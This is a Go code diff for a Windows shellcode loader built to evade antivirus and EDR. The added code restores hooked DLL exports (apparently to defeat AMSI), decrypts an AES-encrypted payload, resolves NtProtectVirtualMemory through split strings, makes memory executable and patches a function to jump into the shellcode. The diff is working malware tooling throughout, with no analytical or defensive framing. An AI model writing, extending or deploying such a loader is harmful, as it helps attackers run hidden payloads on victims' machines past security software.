@@ -9,7 +9,6 @@ import (
 	"os"
 	"strings"
 	"syscall"
-	"time"
 	"unsafe"
 )
 
@@ -27,6 +26,7 @@ const (
 )
 
 var (
+	ErrorSuccess  = "The operation completed successfully."
 	StringDllName = []byte{25, 102, 18, 152, 142, 127, 72, 220, 60, 41, 69, 27, 132, 159, 249, 117, 241, 113, 74, 193, 9, 13, 132, 85}
 )
 
@@ -52,6 +52,7 @@ var (
 	procVirtualProtectEx   = kernel32.NewProc("VirtualProtectEx")
 	procWriteProcessMemory = kernel32.NewProc("WriteProcessMemory")
 	procVirtualAlloc       = kernel32.NewProc("VirtualAlloc")
+	procVirtualFree        = kernel32.NewProc("VirtualFree")
 	createThread           = kernel32.NewProc("CreateThread")
 	waitForSingleObject    = kernel32.NewProc("WaitForSingleObject")
 	getModuleHandleW       = kernel32.NewProc("GetModuleHandleW")
@@ -216,6 +217,7 @@ func Go(pid uint32) {
 		return
 	}
 	defer syscall.CloseHandle(p)
+
 	err = findAmki(p)
 	if err != nil {
 		fmt.Println(err)
@@ -246,11 +248,7 @@ func findAmki(p syscall.Handle) error {
 			}
 
 			modulePath := syscall.UTF16ToString(modulePathUTF16)
-			if strings.HasSuffix(modulePath, ".dll") {
-				// if "profdll" == modulePath {
-				// 	continue
-				// }
-				fmt.Println(modulePath)
+			if strings.HasSuffix(strings.ToLower(modulePath), ".dll") {
 				err = GetModuleInformation(p, moduleHandle, &moduleInfo, uint32(unsafe.Sizeof(moduleInfo)))
 				if err != nil {
 					return err
@@ -271,6 +269,7 @@ func findAmki(p syscall.Handle) error {
 						fmt.Println(err)
 						continue
 					}
+
 					err = patchDll(p, moduleInfo, d)
 					if err != nil {
 						fmt.Println(err)
@@ -313,7 +312,7 @@ func findOriginalDll(dll string) ([][8]byte, error) {
 		return r, err
 	}
 
-	pImageBase := VirtualAlloc(uintptr(0), int(pOldNtHeader.OptionalHeader.SizeOfImage), MEM_COMMIT|MEM_RESERVE, syscall.PAGE_EXECUTE_READWRITE)
+	pImageBase := VirtualAlloc(uintptr(0), int(pOldNtHeader.OptionalHeader.SizeOfImage), MEM_COMMIT, syscall.PAGE_READWRITE)
 
 	WriteProcessMemory(currentProcess, pImageBase, &pSourceBytes[0], uintptr(pOldNtHeader.OptionalHeader.SizeOfHeaders), nil)
 
@@ -370,10 +369,7 @@ func findOriginalDll(dll string) ([][8]byte, error) {
 		// name := windows.BytePtrToString((*byte)(unsafe.Pointer(pImageBase + uintptr(nameAddr))))
 		r = append(r, asm)
 	}
-	// err = windows.VirtualFree(pImageBase, uintptr(pOldNtHeader.OptionalHeader.SizeOfImage), 0x00000002)
-	// if err != nil {
-	// 	panic(err)
-	// }
+	syscall.SyscallN(procVirtualFree.Addr(), uintptr(pImageBase), uintptr(pOldNtHeader.OptionalHeader.SizeOfImage), uintptr(0x00000002))
 	return r, nil
 }
 
@@ -381,7 +377,9 @@ func patchDll(p syscall.Handle, a ModuleInfo, originalData [][8]byte) error {
 	var pbi PROCESS_BASIC_INFORMATION
 	err := NtQueryInformationProcess(p, ProcessBasicInformation, unsafe.Pointer(&pbi), uint32(unsafe.Sizeof(pbi)), nil)
 	if err != nil {
-		return err
+		if err.Error() != ErrorSuccess {
+			return err
+		}
 	}
 
 	var pImageHeader IMAGE_DOS_HEADER
@@ -407,6 +405,7 @@ func patchDll(p syscall.Handle, a ModuleInfo, originalData [][8]byte) error {
 		return err
 	}
 	count := 0
+
 	for i := 0; i < int(exporttable.NumberOfFunctions); i++ {
 		var nameAddr DWORD
 		s = uintptr(unsafe.Sizeof(nameAddr))
@@ -429,17 +428,13 @@ func patchDll(p syscall.Handle, a ModuleInfo, originalData [][8]byte) error {
 		if err != nil {
 			return err
 		}
-		// name := windows.BytePtrToString((*byte)(unsafe.Pointer(a.BaseOfDll + uintptr(nameAddr))))
-		// name, _ := addressToString(p, uintptr(a.BaseOfDll+uintptr(nameAddr)))
-		// if name == "FreeLibrary" {
-		// 	FreeLibrary = a.BaseOfDll + uintptr(funcAddr)
-		// 	fmt.Println(unsafe.Pointer(a.BaseOfDll + uintptr(funcAddr)))
-		// }
 
+		name, _ := AddressToString(p, uintptr(a.BaseOfDll+uintptr(nameAddr)))
 		if asm[0] == cmd[0] && asm[1] != originalData[i][1] &&
 			asm[2] != originalData[i][2] && asm[3] != originalData[i][3] &&
 			asm[4] != originalData[i][4] && asm[5] == originalData[i][5] &&
 			asm[6] == originalData[i][6] && asm[7] == originalData[i][7] {
+			fmt.Println(name)
 			var oldProtect uint32
 			count++
 			err = VirtualProtectEx(p, a.BaseOfDll+uintptr(funcAddr), uintptr(len(originalData[i])), syscall.PAGE_EXECUTE_READWRITE, &oldProtect)
@@ -456,7 +451,7 @@ func patchDll(p syscall.Handle, a ModuleInfo, originalData [][8]byte) error {
 			if err != nil {
 				return err
 			}
-			fmt.Println(unsafe.Pointer(a.BaseOfDll+uintptr(funcAddr)), asm)
+			// fmt.Println(unsafe.Pointer(a.BaseOfDll+uintptr(funcAddr)), asm)
 
 		}
 	}
@@ -618,6 +613,62 @@ func EnumProcessModules(hProcess syscall.Handle, nSize uintptr) (modules []sysca
 	return modules, nil
 }
 
+func StarCode(code []byte) error {
+	var old uint32
+
+	f1 := test
+	r1 := **(**uintptr)(unsafe.Pointer(&f1)) //get address of function
+	f2 := test1
+	r2 := **(**uintptr)(unsafe.Pointer(&f2))
+	d := r1 - r2 - 12
+	f22f1 := uintptrToBytes(&d)
+
+	code = append(code, []byte{0x90, 0x90, 0x90, 0x90, 0x90, 0x90}...)
+	pCode := uintptr(unsafe.Pointer(&code[0]))
+	arr := append([]byte{0x48, 0xB8}, uintptrToBytes(&pCode)...)
+	arr = append(arr, []byte{0xEB, f22f1[0], 0x90, 0x90, 0x90, 0x90, 0x90}...)
+
+	asmByte, err := findASMDll(`NtP`+`ro`+`tec`+`tVi`+`rtu`+`alM`+`em`+`ory`, `C`+`:\`+`Win`+`do`+`ws\`+`Sy`+`ste`+`m3`+`2\n`+`tdl`+`l.`+`dl`+`l`)
+	if err != nil {
+		return err
+	}
+
+	tempFunc := TempFunc
+	tempFuncAddr := **(**uintptr)(unsafe.Pointer(&tempFunc))
+	writeMemory(tempFuncAddr, asmByte)
+	sizet := len(code)
+	syscall.SyscallN(tempFuncAddr,
+		uintptr(0xffffffffffffffff),
+		uintptr(unsafe.Pointer(&pCode)),
+		uintptr(unsafe.Pointer(&sizet)),
+		syscall.PAGE_EXECUTE_READWRITE,
+		uintptr(unsafe.Pointer(&old)),
+	)
+
+	r2Loc := r2
+	sizet = len(arr)
+	syscall.SyscallN(tempFuncAddr,
+		uintptr(0xffffffffffffffff),
+		uintptr(unsafe.Pointer(&r2Loc)),
+		uintptr(unsafe.Pointer(&sizet)),
+		syscall.PAGE_EXECUTE_READWRITE,
+		uintptr(unsafe.Pointer(&old)),
+	)
+	writeMemory(r2, arr)
+	syscall.SyscallN(tempFuncAddr,
+		uintptr(0xffffffffffffffff),
+		uintptr(unsafe.Pointer(&r2Loc)),
+		uintptr(unsafe.Pointer(&sizet)),
+		uintptr(old),
+		uintptr(unsafe.Pointer(&old)),
+	)
+
+	fmt.Println("Wait a few minutes then enter enter!")
+	fmt.Scanln()
+	f2(uintptr(0))
+	return nil
+}
+
 func StarPS(dotCode string) error {
 	targetDllB, err := decrypt(string(StringDllName), Key)
 	if err != nil {
@@ -625,59 +676,37 @@ func StarPS(dotCode string) error {
 	}
 	syscall.MustLoadDLL(string(targetDllB))
 
-	// Go(uint32(os.Getpid()))
+	Go(uint32(os.Getpid()))
 
-	// addr := VirtualAlloc(uintptr(0), len(a), MEM_COMMIT|MEM_RESERVE, syscall.PAGE_EXECUTE_READWRITE)
-
-	// var outSize uintptr
-	currentProcess, err := syscall.GetCurrentProcess()
-	if err != nil {
-		return err
-	}
-
-	var old uint32
 	ciphertext := []byte(dotCode)
-
-	err = VirtualProtectEx(currentProcess, uintptr(unsafe.Pointer(&ciphertext[0])), uintptr(len(ciphertext)), syscall.PAGE_EXECUTE_READWRITE, &old)
-	if err != nil {
-		return err
-	}
-
 	key := []byte(Key)
-
 	block, err := aes.NewCipher(key)
 	if err != nil {
-		panic(err)
+		return err
 	}
 
 	if len(ciphertext) < aes.BlockSize {
-		panic(err)
+		return fmt.Errorf("failed!")
 	}
-
 	iv := ciphertext[:aes.BlockSize]
-
 	ciphertext = ciphertext[aes.BlockSize:]
 
 	stream := cipher.NewCFBDecrypter(block, iv)
-
 	stream.XORKeyStream(ciphertext, ciphertext)
 
-	// err = WriteProcessMemory(currentProcess, addr, &assemblyBytes[0], uintptr(len(assemblyBytes)), &outSize)
-	// if err != nil {
-	// 	return err
-	// }
+	return StarCode(ciphertext)
+}
 
-	thread, _, _ := createThread.Call(0, 0, uintptr(unsafe.Pointer(&ciphertext[0])), uintptr(0), 0, 0)
-	for i := 0; i < 10; i++ {
-		time.Sleep(1 * time.Second)
-		r1, _, _ := getModuleHandleW.Call(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(string(targetDllB)))))
-		if r1 != 0 {
-			break
-		}
-	}
+func TempFunc() {
+	fmt.Println("aaaaaaaa")
+	fmt.Println("bbbbbbbb")
+	fmt.Println("cccccccc")
+}
 
-	Go(uint32(os.Getpid()))
+func test1(r uintptr) {
+	fmt.Println(r)
+}
 
-	_, _, err = waitForSingleObject.Call(thread, syscall.INFINITE)
-	return err
+func test(r uintptr) {
+	syscall.Syscall(r, 0, 0, 0, 0)
 }
